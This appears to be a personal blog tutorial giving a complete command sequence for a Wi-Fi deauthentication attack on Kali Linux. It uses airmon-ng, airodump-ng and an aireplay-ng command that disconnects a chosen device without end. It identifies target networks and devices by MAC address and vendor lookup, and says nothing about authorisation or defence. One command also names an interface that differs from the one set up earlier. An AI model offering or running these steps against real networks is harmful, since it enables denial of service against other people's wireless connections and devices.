---
title: Wifi Deauthentication attack on Kali linux
date: 2020-03-24
description: "Conducting a wifi deauthentication attack"
tags:
  - hacking
  - linux
---

You might have to run these as `sudo` (root). Also, do not be alarmed if your computer does not find your wifi card. A clean reboot will solve the issue.

1.  Get the name if your wireless card : the only one with information.

```bash
iwconfig
```

Mine was `wlp2s0`.

2.  Put the boi is monitor mode. This is to allow it to monitor network traffic.

```bash
airmon-ng start wlp2s0
```

3.  Run `iwconfig` again. It should now have a `mon` at the end. Mine became `wlp2s0mon`.
4.  Run the following to see the list of routers and their corresponding WiFi names. Note the BSSID( that’s the Mac address) of the network of choice, and it’s channel (CH).

```bash
airodump-ng wlp2s0mon
```

5.  Run the following to see the devices connected to this WiFi. These appear under “Station”. It’s the mac address of the device.

```bash
airodump-ng wlan0mon --bssid [routers BSSID here]--channel [routers channel here]
```

To find out what the device is, google the first 3 sections of the device’s mac address, and you can see the device manufacturer info and hence be able to identify the device.

6.  Deauth! Run:

```bash
aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlp2s0mon
```

0 is for infinite attacks, until manually stopped. Specify a number of choice for finite number of attacks.

### References:

[This cool hackernoon article.](https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142)
